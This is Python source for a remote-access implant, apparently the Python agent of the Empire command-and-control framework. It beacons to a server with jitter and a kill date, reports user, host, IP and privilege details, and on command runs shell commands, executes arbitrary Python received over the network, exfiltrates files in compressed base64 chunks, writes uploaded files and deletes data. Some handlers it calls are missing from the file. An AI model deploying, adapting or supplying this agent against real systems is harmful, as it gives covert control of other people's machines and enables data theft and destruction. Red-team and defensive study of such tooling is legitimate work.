import base64
import datetime
import grp
import http.server
import io
import json
import numbers
import os
import platform
import pwd
import queue as Queue
import random
import re
import shutil
import socket
import stat
import struct
import subprocess
import sys
import threading
import time
import traceback
import types
import zipfile
import zlib
from io import StringIO
from os.path import expanduser
from threading import Thread
import hmac

################################################
#
# agent configuration information
#
################################################
moduleRepo = {}
_meta_cache = {}


def old_div(a, b):
    """
    Equivalent to ``a / b`` on Python 2 without ``from __future__ import
    division``.
    """
    if isinstance(a, numbers.Integral) and isinstance(b, numbers.Integral):
        return a // b
    else:
        return a / b


################################################
#
# Custom Import Hook
# #adapted from https://github.com/sulinx/remote_importer
#
################################################

# [0] = .py ext, is_package = False
# [1] = /__init__.py ext, is_package = True
_search_order = [(".py", False), ("/__init__.py", True)]


class ZipImportError(ImportError):
    """Exception raised by zipimporter objects."""
    pass


# _get_info() = takes the fullname, then subpackage name (if applicable),
# and searches for the respective module or package


class CFinder(object):
    """Import Hook for Empire"""

    def __init__(self, repoName):
        self.repoName = repoName

    def _get_info(self, repoName, fullname):
        """Search for the respective package or module in the zipfile object"""
        parts = fullname.split(".")
        submodule = parts[-1]
        modulepath = "/".join(parts)

        # check to see if that specific module exists
        for suffix, is_package in _search_order:
            relpath = modulepath + suffix
            try:
                moduleRepo[repoName].getinfo(relpath)
            except KeyError:
                pass
            else:
                return submodule, is_package, relpath

        # Error out if we can find the module/package
        msg = "Unable to locate module %s in the %s repo" % (submodule, repoName)
        raise ZipImportError(msg)

    def _get_source(self, repoName, fullname):
        """Get the source code for the requested module"""
        submodule, is_package, relpath = self._get_info(repoName, fullname)
        fullpath = "%s/%s" % (repoName, relpath)
        source = moduleRepo[repoName].read(relpath)
        source = source.replace("\r\n", "\n")
        source = source.replace("\r", "\n")
        return submodule, is_package, fullpath, source

    def find_module(self, fullname, path=None):

        try:
            submodule, is_package, relpath = self._get_info(self.repoName, fullname)
        except ImportError:
            return None
        else:
            return self

    def load_module(self, fullname):
        submodule, is_package, fullpath, source = self._get_source(
            self.repoName, fullname
        )
        code = compile(source, fullpath, "exec")
        mod = sys.modules.setdefault(fullname, types.ModuleType(fullname))
        mod.__loader__ = self
        mod.__file__ = fullpath
        mod.__name__ = fullname
        if is_package:
            mod.__path__ = [os.path.dirname(mod.__file__)]
        exec(code, mod.__dict__)
        return mod

    def get_data(self, fullpath):

        prefix = os.path.join(self.repoName, "")
        if not fullpath.startswith(prefix):
            raise IOError(
                "Path %r does not start with module name %r", (fullpath, prefix)
            )
        relpath = fullpath[len(prefix) :]
        try:
            return moduleRepo[self.repoName].read(relpath)
        except KeyError:
            raise IOError("Path %r not found in repo %r" % (relpath, self.repoName))

    def is_package(self, fullname):
        """Return if the module is a package"""
        submodule, is_package, relpath = self._get_info(self.repoName, fullname)
        return is_package

    def get_code(self, fullname):
        submodule, is_package, fullpath, source = self._get_source(
            self.repoName, fullname
        )
        return compile(source, fullpath, "exec")

    def install_hook(repoName):
        if repoName not in _meta_cache:
            finder = CFinder(repoName)
            _meta_cache[repoName] = finder
            sys.meta_path.append(finder)

    def remove_hook(repoName):
        if repoName in _meta_cache:
            finder = _meta_cache.pop(repoName)
            sys.meta_path.remove(finder)

################################################
#
# misc methods
#
################################################
class compress(object):
    """
    Base clase for init of the package. This will handle
    the initial object creation for conducting basic functions.
    """

    CRC_HSIZE = 4
    COMP_RATIO = 9

    def __init__(self, verbose=False):
        """
        Populates init.
        """
        pass

    def comp_data(self, data, cvalue=COMP_RATIO):
        """
        Takes in a string and computes
        the comp obj.
        data = string wanting compression
        cvalue = 0-9 comp value (default 6)
        """
        cdata = zlib.compress(data, cvalue)
        return cdata

    def crc32_data(self, data):
        """
        Takes in a string and computes crc32 value.
        data = string before compression
        returns:
        HEX bytes of data
        """
        crc = zlib.crc32(data) & 0xFFFFFFFF
        return crc

    def build_header(self, data, crc):
        """
        Takes comp data, org crc32 value,
        and adds self header.
        data =  comp data
        crc = crc32 value
        """
        header = struct.pack("!I", crc)
        built_data = header + data
        return built_data


class decompress(object):
    """
    Base clase for init of the package. This will handle
    the initial object creation for conducting basic functions.
    """

    CRC_HSIZE = 4
    COMP_RATIO = 9

    def __init__(self, verbose=False):
        """
        Populates init.
        """
        pass

    def dec_data(self, data, cheader=True):
        """
        Takes:
        Custom / standard header data
        data = comp data with zlib header
        BOOL cheader = passing custom crc32 header
        returns:
        dict with crc32 cheack and dec data string
        ex. {"crc32" : true, "dec_data" : "-SNIP-"}
        """
        if cheader:
            comp_crc32 = struct.unpack("!I", data[: self.CRC_HSIZE])[0]
            dec_data = zlib.decompress(data[self.CRC_HSIZE :])
            dec_crc32 = zlib.crc32(dec_data) & 0xFFFFFFFF
            if comp_crc32 == dec_crc32:
                crc32 = True
            else:
                crc32 = False
            return {
                "header_crc32": comp_crc32,
                "dec_crc32": dec_crc32,
                "crc32_check": crc32,
                "data": dec_data,
            }
        else:
            dec_data = zlib.decompress(data)
            return dec_data


def indent(lines, amount=4, ch=" "):
    padding = amount * ch
    return padding + ("\n" + padding).join(lines.split("\n"))


# from http://stackoverflow.com/questions/6893968/how-to-get-the-return-value-from-a-thread-in-python
class ThreadWithReturnValue(Thread):
    def __init__(
        self, group=None, target=None, name=None, args=(), kwargs={}, Verbose=None
    ):
        Thread.__init__(self, group, target, name, args, kwargs, Verbose)
        self._return = None

    def run(self):
        if self._Thread__target is not None:
            self._return = self._Thread__target(
                *self._Thread__args, **self._Thread__kwargs
            )

    def join(self):
        Thread.join(self)
        return self._return


class KThread(threading.Thread):
    """A subclass of threading.Thread, with a kill()
    method."""

    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run  # Force the Thread to install our trace.
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the
        trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == "call":
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == "line":
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True


class MainAgent:
    def __init__(self,
                 packet_handler,
                 profile,
                 server,
                 session_id,
                 kill_date,
                 working_hours,
                 delay=60,
                 jitter=0.0,
                 lost_limit=60
                 ):

        if server.endswith("/"):
            server = server[0:-1]
        self.server = server.rstrip("/")

        # Functions that need to be passed in
        # self.packet_handler = ExtendedPacketHandler(self, staging_key=staging_key, session_id=session_id, key=key)
        self.packet_handler = packet_handler
        self.profile = profile
        self.delay = delay
        self.jitter = jitter
        self.lostLimit = lost_limit
        self.kill_date = kill_date
        self.working_hours = working_hours
        self.defaultResponse = base64.b64decode("")
        self.packet_handler.missedCheckins = 0
        self.sessionID = session_id
        self.job_message_buffer = ""
        self.socksthread = False
        self.socksqueue = None
        self.tasks = {}

        parts = self.profile.split("|")
        self.userAgent = parts[1]
        headersRaw = parts[2:]

        self.headers = {"User-Agent": self.userAgent}

        for headerRaw in headersRaw:
            try:
                headerKey = headerRaw.split(":")[0]
                headerValue = headerRaw.split(":")[1]

                if headerKey.lower() == "cookie":
                    self.headers["Cookie"] = "%s;%s" % (self.headers["Cookie"], headerValue)
                else:
                    self.headers[headerKey] = headerValue
            except:
                pass

    def agent_exit(self):
        # exit for proper job / thread cleanup
        if len(self.tasks) > 0:
            try:
                for x in self.tasks:
                    self.tasks[x]['task_thread'].kill()
                    self.tasks[x]['reading_thread'].kill()
            except:
                # die hard if thread kill fails
                pass
        sys.exit()

    def send_job_message_buffer(self):
        if self.job_message_buffer != "":
            result = self.get_job_message_buffer()
            self.packet_handler.process_job_tasking(result)
        else:
            pass

    def run_prebuilt_command(self, data, result_id):
        """
        Run a command on the system and return the results.
        Task 40
        """
        parts = data.split(" ")
        if len(parts) == 1:
            data = parts[0]
            result_data = str(self.run_command(data))
            self.packet_handler.send_message(self.packet_handler.build_response_packet(40, result_data, result_id))
        else:
            cmd = parts[0]
            cmdargs = " ".join(parts[1: len(parts)])
            result_data = str(self.run_command(cmd, cmdargs=cmdargs))
            self.packet_handler.send_message(self.packet_handler.build_response_packet(40, result_data, result_id))
        self.tasks[result_id]["status"] = "completed"

    def file_download(self, data, result_id):
        """
        Download a file from the server.
        Task 41
        """
        objPath = os.path.abspath(data)
        fileList = []
        if not os.path.exists(objPath):
            self.packet_handler.send_message(
                self.packet_handler.build_response_packet(
                    40, "file does not exist or cannot be accessed", result_id
                )
            )

        if not os.path.isdir(objPath):
            fileList.append(objPath)
        else:
            # recursive dir listing
            for folder, subs, files in os.walk(objPath):
                for filename in files:
                    # dont care about symlinks
                    if os.path.exists(objPath):
                        fileList.append(objPath + "/" + filename)

        for filePath in fileList:
            offset = 0
            size = os.path.getsize(filePath)
            partIndex = 0

            while True:

                # get 512kb of the given file starting at the specified offset
                encodedPart = self.get_file_part(filePath, offset=offset, base64=False)
                c = compress()
                start_crc32 = c.crc32_data(encodedPart)
                comp_data = c.comp_data(encodedPart)
                encodedPart = c.build_header(comp_data, start_crc32)
                encodedPart = base64.b64encode(encodedPart).decode("UTF-8")

                partData = "%s|%s|%s|%s" % (partIndex, filePath, size, encodedPart)
                if not encodedPart or encodedPart == "" or len(encodedPart) == 16:
                    break

                self.packet_handler.send_message(self.packet_handler.build_response_packet(41, partData, result_id))

                minSleep = int((1.0 - self.jitter) * self.delay)
                maxSleep = int((1.0 + self.jitter) * self.delay)
                sleepTime = random.randint(minSleep, maxSleep)
                time.sleep(sleepTime)
                partIndex += 1
                offset += 512000
        self.tasks[result_id]["status"] = "completed"

    def file_upload(self, data, result_id):
        """
        Upload a file to the server.
        Task 42
        """
        try:
            parts = data.split("|")
            filePath = parts[0]
            base64part = parts[1]
            raw = base64.b64decode(base64part)
            with open(filePath, "ab") as f:
                f.write(raw)
            self.packet_handler.send_message(
                self.packet_handler.build_response_packet(
                    42, "[*] Upload of %s successful" % (filePath), result_id
                )
            )
            self.tasks[result_id]["status"] = "completed"
        except Exception as e:
            self.packet_handler.send_message(
                self.packet_handler.build_response_packet(
                    0,
                    "[!] Error in writing file %s during upload: %s"
                    % (filePath, str(e)),
                    result_id,
                )
            )
            self.tasks[result_id]["status"] = "error"

    def directory_list(self, data, result_id):
        """
        List a directory on the target.
        Task 43
        """
        cmdargs = data

        path = "/"  # default to root
        if (
                cmdargs is not None and cmdargs != "" and cmdargs != "/"
        ):  # strip trailing slash for uniformity
            path = cmdargs.rstrip("/")
        if path[0] != "/":  # always scan relative to root for uniformity
            path = "/{0}".format(path)
        if not os.path.isdir(path):
            self.packet_handler.send_message(
                self.packet_handler.build_response_packet(
                    43, "Directory {} not found.".format(path), result_id
                )
            )
        items = []
        with os.scandir(path) as it:
            for entry in it:
                items.append(
                    {"path": entry.path, "name": entry.name, "is_file": entry.is_file()}
                )

        result_data = json.dumps(
            {
                "directory_name": path if len(path) == 1 else path.split("/")[-1],
                "directory_path": path,
                "items": items,
            }
        )

        self.packet_handler.send_message(self.packet_handler.build_response_packet(43, result_data, result_id))
        self.tasks[result_id]["status"] = "completed"

    def task_list(self, result_id):
        """
        Return a list of all running agent jobs as a formatted table.
        TODO: Return JSON instead of a table.
        Task 50
        """
        self.tasks[result_id]["status"] = "completed"

        filtered_tasks = {
            task_id: {
                "status": task_info.get("status", "N/A")
            } for task_id, task_info in self.tasks.items()
        }

        headers = ["Task ID", "Status"]
        rows = [[task_id, task_info["status"]] for task_id, task_info in filtered_tasks.items()]
        column_widths = [max(len(str(item)) for item in col) for col in zip(*([headers] + rows))]
        separator = ' | '.join('-' * width for width in column_widths)
        header_line = ' | '.join(headers[i].ljust(column_widths[i]) for i in range(len(headers)))

        table_lines = [header_line, separator]
        for row in rows:
            row_line = ' | '.join(str(row[i]).ljust(column_widths[i]) for i in range(len(row)))
            table_lines.append(row_line)

        tasks_table = '\n'.join(table_lines)
        self.packet_handler.send_message(self.packet_handler.build_response_packet(50, tasks_table, result_id))

    def stop_task(self, job_to_kill, result_id):
        """
        Stop a running job.
        Task 51
        """
        try:
            if self.tasks[job_to_kill]['task_thread'].is_alive():
                self.tasks[job_to_kill]['task_thread'].kill()
                self.tasks[job_to_kill]['status'] = "stopped"
                self.packet_handler.send_message(
                    self.packet_handler.build_response_packet(
                        51, "[+] Job thread %s stopped successfully" % (job_to_kill), result_id
                    )
                )
                if self.tasks[job_to_kill]['reading_thread'].is_alive():
                    self.tasks[job_to_kill]['reading_thread'].kill()
            else:
                self.packet_handler.send_message(
                    self.packet_handler.build_response_packet(
                        51, "[!] Job thread %s already stopped" % (job_to_kill), result_id
                    )
                )

            self.tasks[result_id]["status"] = "completed"

        except Exception as e:
            self.packet_handler.send_message(
                self.packet_handler.build_response_packet(
                    51, "[!] Error stopping job thread: %s" % (e), result_id
                )
            )
            self.tasks[result_id]["status"] = "error"

    def dynamic_code_execute_wait_nosave(self, data, result_id):
        """
        Execute dynamic code and wait for the results without saving output.
        Task 110
        """
        try:
            globals().update({'agent':self})
            buffer = StringIO()
            sys.stdout = buffer
            code_obj = compile(data, "<string>", "exec")
            exec(code_obj, globals())
            sys.stdout = sys.__stdout__
            results = buffer.getvalue()
            self.packet_handler.send_message(self.packet_handler.build_response_packet(110, str(results), result_id))
            self.tasks[result_id]["status"] = "completed"

        except Exception as e:
            errorData = str(buffer.getvalue())
            self.packet_handler.build_response_packet(
                0,
                "error executing TASK_PYTHON_CMD_WAIT: %s \nBuffer data recovered:\n%s"
                % (e, errorData),
                result_id,
            )
            self.tasks[result_id]["status"] = "error"

    def dynamic_code_execution_wait_save(self, data, result_id):
        """
        Execute dynamic code and wait for the results while saving output.
        Task 111
        """
        prefix = data[0:15].strip()
        extension = data[15:20].strip()
        data = data[20:]
        try:
            buffer = StringIO()
            sys.stdout = buffer
            code_obj = compile(data, "<string>", "exec")
            exec(code_obj, globals())
            sys.stdout = sys.__stdout__
            results = buffer.getvalue().encode("latin-1")
            c = compress()
            start_crc32 = c.crc32_data(results)
            comp_data = c.comp_data(results)
            encodedPart = c.build_header(comp_data, start_crc32)
            encodedPart = base64.b64encode(encodedPart).decode("UTF-8")
            self.packet_handler.send_message(
                self.packet_handler.build_response_packet(
                    111,
                    "{0: <15}".format(prefix)
                    + "{0: <5}".format(extension)
                    + encodedPart,
                    result_id,
                )
            )
            self.tasks[result_id]["status"] = "completed"

        except Exception as e:
            # Also return partial code that has been executed
            errorData = buffer.getvalue()
            self.packet_handler.send_message(
                self.packet_handler.build_response_packet(
                    0,
                    "error executing TASK_PYTHON_CMD_WAIT_SAVE %s \nBuffer data recovered:\n%s"
                    % (e, errorData),
                    result_id,
                )
            )
            self.tasks[result_id]["status"] = "error"

    def disk_code_execution_wait_save(self, data, result_id):
        """
        Execute on-disk code and wait for the results while saving output.
        Adjusted for Windows and cross-platform compatibility.
        Task 112
        """
        try:
            script_globals = {}
            output_capture = io.StringIO()
            sys.stdout = output_capture

            try:
                exec(data, script_globals)
            except SyntaxError as e:
                result = "[!] Syntax error in script: %s on line %d - %s" % (str(e), e.lineno, e.text)
                self.packet_handler.send_message(
                    self.packet_handler.build_response_packet(0, result, result_id)
                )
                self.tasks[result_id]["status"] = "error"
                return

            except Exception as e:
                result = "[!] Error executing script: %s" % str(e)
                self.packet_handler.send_message(
                    self.packet_handler.build_response_packet(0, result, result_id)
                )
                self.tasks[result_id]["status"] = "error"
                return

            captured_output = output_capture.getvalue()

            if captured_output:
                result = "[*] Output from script:\n" + captured_output
            else:
                result = "[*] No output captured from the script.\n"

            if 'output' in script_globals:
                result += "[*] Output variable from script: \n" + str(script_globals['output'])

            self.packet_handler.send_message(
                self.packet_handler.build_response_packet(112, result, result_id)
            )
            self.tasks[result_id]["status"] = "completed"

        except Exception as e:
            self.packet_handler.send_message(
                self.packet_handler.build_response_packet(
                    0, "error executing TASK_PYTHON_CMD_JOB: %s" % (e), result_id
                )
            )
            self.tasks[result_id]["status"] = "error"

        finally:
            sys.stdout = sys.__stdout__


    def start_python_job(self, code, result_id):
        # create a new code block with a defined method name
        code_block = "def method():\n" + indent(code)

        # register the code block
        code_obj = compile(code_block, "<string>", "exec")
        # code needs to be in the global listing
        # not the locals() scope
        exec(code_obj, globals())

        # create/process Packet start/return the thread
        # call the job_func so sys data can be captured
        code_thread = KThread(target=self.python_job_func, args=(result_id,))
        code_thread.start()

        self.tasks[result_id]['task_thread'] = code_thread
        self.tasks[result_id]["status"] = "running"

    def python_job_func(self, result_id):
        try:
            buffer = StringIO()
            sys.stdout = buffer
            # now call the function required
            # and capture the output via sys
            method()
            sys.stdout = sys.__stdout__
            data_stats = buffer.getvalue()
            result = self.packet_handler.build_response_packet(110, str(data_stats), result_id)
            self.packet_handler.process_job_tasking(result)
            self.tasks[result_id]["status"] = "completed"

        except Exception as e:
            p = "error executing specified Python job data: " + str(e)
            result = self.packet_handler.build_response_packet(0, p, result_id)
            self.packet_handler.process_job_tasking(result)
            self.tasks[result_id]["status"] = "error"

    def job_message_buffer(self, message):
        # Supports job messages for checkin
        try:
            self.job_message_buffer += str(message)
        except Exception as e:
            print("[!] Error adding job output to buffer: %s" % (e))

    def get_job_message_buffer(self):
        try:
            result = self.packet_handler.build_response_packet(110, str(self.job_message_buffer))
            self.job_message_buffer = ""
            return result
        except Exception as e:
            return self.packet_handler.build_response_packet(0, "[!] Error getting job output: %s" % (e))

    def start_webserver(self, data, ip, port, serveCount):
        # thread data_webserver for execution
        t = threading.Thread(target=self.data_webserver, args=(data, ip, port, serveCount))
        t.start()
        return

    def data_webserver(self, data, ip, port, serveCount):
        # hosts a file on port and IP servers data string
        hostName = str(ip)
        portNumber = int(port)
        data = str(data)
        serveCount = int(serveCount)
        count = 0

        class serverHandler(http.server.BaseHTTPRequestHandler):
            def do_GET(s):
                """Respond to a GET request."""
                s.send_response(200)
                s.send_header("Content-type", "text/html")
                s.end_headers()
                s.wfile.write(data)

            def log_message(s, format, *args):
                return

        server_class = http.server.HTTPServer
        httpServer = server_class((hostName, portNumber), serverHandler)
        try:
            while count < serveCount:
                httpServer.handle_request()
                count += 1
        except:
            pass
        httpServer.server_close()
        return

    def permissions_to_unix_name(self, st_mode):
        permstr = ""
        usertypes = ["USR", "GRP", "OTH"]
        for usertype in usertypes:
            perm_types = ["R", "W", "X"]
            for permtype in perm_types:
                perm = getattr(stat, "S_I%s%s" % (permtype, usertype))
                if st_mode & perm:
                    permstr += permtype.lower()
                else:
                    permstr += "-"
        return permstr

    def directory_listing(self, path):
        # directory listings in python
        # https://www.opentechguides.com/how-to/article/python/78/directory-file-list.html

        res = ""
        for fn in os.listdir(path):
            fstat = os.stat(os.path.join(path, fn))
            permstr = self.permissions_to_unix_name(fstat[0])

            if os.path.isdir(fn):
                permstr = "d{}".format(permstr)
            else:
                permstr = "-{}".format(permstr)

            user = pwd.getpwuid(fstat.st_uid)[0]
            group = grp.getgrgid(fstat.st_gid)[0]

            # Convert file size to MB, KB or Bytes
            fsize = fstat.st_size
            unit = "B"

            if fsize > 1024:
                fsize >>= 10
                unit = "KB"

            if fsize > 1024:
                fsize >>= 10
                unit = "MB"

            mtime = time.strftime("%X %x", time.gmtime(fstat.st_mtime))

            res += "{} {} {} {:18s} {:f} {:2s} {:15.15s}\n".format(
                permstr, user, group, mtime, fsize, unit, fn
            )

        return res

    # additional implementation methods
    def run_command(self, command, cmdargs=None):
        if command == "shell":
            if cmdargs is None:
                return "no shell command supplied"

            p = subprocess.Popen(
                cmdargs,
                stdin=None,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                shell=True,
            )
            return p.communicate()[0].strip().decode("UTF-8")
        elif re.compile("(ls|dir)").match(command):
            if cmdargs == None or not os.path.exists(cmdargs):
                cmdargs = "."

            return self.directory_listing(cmdargs)
        elif re.compile("cd").match(command):
            os.chdir(cmdargs)
            return str(os.getcwd())
        elif re.compile("pwd").match(command):
            return str(os.getcwd())
        elif re.compile("rm").match(command):
            if cmdargs is None:
                return "please provide a file or directory"

            if os.path.exists(cmdargs):
                if os.path.isfile(cmdargs):
                    os.remove(cmdargs)
                    return "done."
                elif os.path.isdir(cmdargs):
                    shutil.rmtree(cmdargs)
                    return "done."
                else:
                    return "unsupported file type"
            else:
                return "specified file/directory does not exist"
        elif re.compile("mkdir").match(command):
            if cmdargs is None:
                return "please provide a directory"

            os.mkdir(cmdargs)
            return "Created directory: {}".format(cmdargs)

        elif re.compile("(whoami|getuid)").match(command):
            return pwd.getpwuid(os.getuid())[0]

        elif re.compile("hostname").match(command):
            return str(socket.gethostname())

        else:
            if cmdargs is not None:
                command = "{} {}".format(command, cmdargs)

            p = subprocess.Popen(
                command,
                stdin=None,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                shell=True,
            )
            return p.communicate()[0].strip().decode("UTF-8")

    def get_file_part(self, filePath, offset=0, chunkSize=512000, base64=True):
        if not os.path.exists(filePath):
            return ""

        f = open(filePath, "rb")
        f.seek(offset, 0)
        data = f.read(chunkSize)
        f.close()
        if base64:
            return base64.b64encode(data)
        else:
            return data

    def get_sysinfo(self, server, nonce='00000000'):
        # NOTE: requires global variable "server" to be set

        # nonce | listener | domainname | username | hostname | internal_ip | os_details | os_details | high_integrity | process_name | process_id | language | language_version | architecture
        __FAILED_FUNCTION = '[FAILED QUERY]'

        try:
            username = pwd.getpwuid(os.getuid())[0].strip("\\")
        except Exception as e:
            username = __FAILED_FUNCTION
        try:
            uid = os.popen('id -u').read().strip()
        except Exception as e:
            uid = __FAILED_FUNCTION
        try:
            highIntegrity = "True" if (uid == "0") else False
        except Exception as e:
            highIntegrity = __FAILED_FUNCTION
        try:
            osDetails = os.uname()
        except:
            osDetails = __FAILED_FUNCTION
        try:
            processID = os.getpid()
        except Exception as e:
            processID = __FAILED_FUNCTION
        try:
            hostname = osDetails[1]
        except Exception as e:
            hostname = __FAILED_FUNCTION
        try:
            internalIP = socket.gethostbyname(socket.gethostname())
        except Exception as e:
            try:
                internalIP = os.popen("ifconfig|grep inet|grep inet6 -v|grep -v 127.0.0.1|cut -d' ' -f2").read()
            except Exception as e1:
                internalIP = __FAILED_FUNCTION
        try:
            osDetails = ",".join(osDetails)
        except Exception as e:
            osDetails = __FAILED_FUNCTION
        try:
            temp = sys.version_info
            pyVersion = "%s.%s" % (temp[0], temp[1])
        except Exception as e:
            pyVersion = __FAILED_FUNCTION
        try:
            architecture = platform.machine()
        except Exception as e:
            architecture = __FAILED_FUNCTION

        language = 'python'
        cmd = 'ps %s' % (os.getpid())
        ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = ps.communicate()
        parts = out.split(b"\n")
        if len(parts) > 2:
            processName = b" ".join(parts[1].split()[4:]).decode('UTF-8')
        else:
            processName = 'python'
        return "%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s" % (
        nonce, server, '', username, hostname, internalIP, osDetails, highIntegrity, processName, processID, language,
        pyVersion, architecture)

    def process_packet(self, packet_type, data, result_id):
        try:
            packet_type = int(packet_type)
            if packet_type == 61:
                # Avoids tracking temp tasks
                self.socksqueue.put(base64.b64decode(data.encode("UTF-8")))
                return

            else:
                self.tasks[result_id] = {
                    "result_id": result_id,
                    "packet_type": packet_type,
                    "status": "started",
                    "task_thread": None,
                    "reading_thread": None,
                    "language": None,
                    "powershell":
                        {
                            "app_domain": None,
                            "ps_host": None,
                            "buffer": None,
                            "ps_host_exec": None
                        }
                }

            if packet_type == 1:
                # sysinfo request
                # get_sysinfo should be exposed from stager.py
                self.packet_handler.send_message(self.packet_handler.build_response_packet(1, self.get_sysinfo(server=self.server), result_id))
                self.tasks[result_id]["status"] = "completed"

            elif packet_type == 2:
                # agent exit
                self.packet_handler.send_message(self.packet_handler.build_response_packet(2, "", result_id))
                self.agent_exit()

            elif packet_type == 40:
                self.run_prebuilt_command(data, result_id)

            elif packet_type == 41:
                self.file_download(data, result_id)

            elif packet_type == 42:
                self.file_upload(data, result_id)

            elif packet_type == 43:
                self.directory_list(data, result_id)

            elif packet_type == 50:
                self.job_list(result_id)

            elif packet_type == 51:
                self.stop_job(data, result_id)

            elif packet_type == 60:
                self.packet_handler.send_message(
                    self.packet_handler.build_response_packet(
                        0, "[!] SOCKS Server not implemented", result_id
                    )
                )

            elif packet_type == 61:
                self.packet_handler.send_message(
                    self.packet_handler.build_response_packet(
                        0, "[!] SOCKS Server not implemented", result_id
                    )
                )

            elif packet_type == 70:
                self.start_smb_pipe_server(data, result_id)

            elif packet_type == 100:
                self.tasks[result_id]["status"] = "unimplemented"
                pass

            elif packet_type == 100:
                self.tasks[result_id]["status"] = "unimplemented"
                pass

            elif packet_type == 101:
                self.tasks[result_id]["status"] = "unimplemented"
                pass

            elif packet_type == 102:
                self.powershell_task(data, result_id)

            elif packet_type == 110:
                self.dynamic_code_execute_wait_nosave(data, result_id)

            elif packet_type == 111:
                self.dynamic_code_execution_wait_save(data, result_id)

            elif packet_type == 112:
                self.disk_code_execution_wait_save(data, result_id)

            elif packet_type == 113:
                self.start_python_job(data, result_id)

            elif packet_type == 120:
                self.tasks[result_id]["status"] = "unimplemented"
                pass

            elif packet_type == 122:
                self.tasks[result_id]["status"] = "unimplemented"
                pass

            elif packet_type == 220:
                # Dynamically update agent comms
                self.packet_handler.send_message(
                    self.packet_handler.build_response_packet(
                        60, "[!] Switch agent comms not implemented", result_id
                    )
                )
                self.tasks[result_id]["status"] = "unimplemented"

            elif packet_type == 221:
                # Update the listener name variable
                self.packet_handler.send_message(
                    self.packet_handler.build_response_packet(
                        60, "[!] Switch agent comms not implemented", result_id
                    )
                )
                self.tasks[result_id]["status"] = "unimplemented"

            else:
                self.packet_handler.send_message(
                    self.packet_handler.build_response_packet(0, "invalid tasking ID: %s" % (packet_type), result_id)
                )
                self.tasks[result_id]["status"] = "error"
        except Exception as e:
            self.packet_handler.send_message(
                self.packet_handler.build_response_packet(0, "error processing packet: %s" % (e), result_id)
            )
            self.tasks[result_id]["status"] = "error"

    def run(self):
        while True:
            try:
                if self.working_hours and "WORKINGHOURS" not in self.working_hours:
                    try:
                        start, end = self.working_hours.split("-")
                        now = datetime.datetime.now()
                        startTime = datetime.datetime.strptime(start, "%H:%M")
                        endTime = datetime.datetime.strptime(end, "%H:%M")

                        if not (startTime <= now <= endTime):
                            sleepTime = startTime - now
                            time.sleep(sleepTime.seconds)

                    except Exception as e:
                        pass

                if self.kill_date and "KILLDATE" not in self.kill_date:
                    now = datetime.datetime.now().date()
                    try:
                        kill_date_time = datetime.datetime.strptime(self.kill_date, "%m/%d/%Y").date()
                    except:
                        pass

                    if now >= kill_date_time:
                        msg = "[!] Agent %s exiting" % (self.sessionID)
                        self.packet_handler.send_message(self.packet_handler.build_response_packet(2, msg))
                        self.agent_exit()

                if self.packet_handler.missedCheckins >= self.lostLimit:
                    self.agent_exit()

                if self.jitter < 0:
                    self.jitter = -self.jitter
                if self.jitter > 1:
                    self.jitter = 1 / self.jitter

                minSleep = int((1.0 - self.jitter) * self.delay)
                maxSleep = int((1.0 + self.jitter) * self.delay)

                sleepTime = random.randint(minSleep, maxSleep)
                time.sleep(sleepTime)

                code, data = self.packet_handler.send_message()

                if code == "200":
                    try:
                        self.send_job_message_buffer()
                    except Exception as e:
                        result = self.packet_handler.build_response_packet(
                            0, str("[!] Failed to check job buffer!: " + str(e))
                        )
                        self.packet_handler.process_job_tasking(result)

                    if data.strip() == self.defaultResponse.strip() or data == base64.b64encode(self.defaultResponse):
                        self.packet_handler.missedCheckins = 0
                    else:
                        self.packet_handler.decode_routing_packet(data)
                else:
                    pass

            except Exception as e:
                print("main() exception: %s" % (e))
                traceback.print_exc()
